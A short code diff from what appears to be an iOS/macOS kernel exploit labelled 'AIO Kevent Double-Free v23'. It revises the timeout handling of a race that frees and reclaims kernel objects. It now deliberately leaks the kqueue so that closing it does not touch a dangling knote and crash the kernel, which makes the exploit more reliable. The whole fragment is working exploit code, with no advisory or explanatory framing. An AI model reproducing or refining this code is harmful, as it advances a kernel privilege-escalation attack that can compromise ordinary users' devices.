@@ -5733,7 +5733,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v22 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v23 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5873,12 +5873,14 @@ static void *e2_free_and_ool_racer(void *arg) {
             break;  // SUCCESS
         } else {
             [self appendLog:[NSString stringWithFormat:@"  kevent64 timeout (nev=%d)", nev]];
-            // v22: FORWARD cleanup on timeout too — avoids close(kq)
-            // UAF on the reclaim entry's knote.
+            // v23: LEAK kq on timeout — kevent64 didn't consume the knote,
+            // so close(kq) would call filt_aiodetach on dangling knote → crash.
+            // Forward cleanup frees reclaim entries, then we leak the kq.
+            // This is the same strategy as "freed but no reclaim" path.
             for (int i = 0; i < AIO_NRECLAIM; i++) {
                 if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
             }
-            close(kq);
+            [self appendLog:[NSString stringWithFormat:@"  leaking kq=%d (knote still registered)", kq]];
         }
     }
 
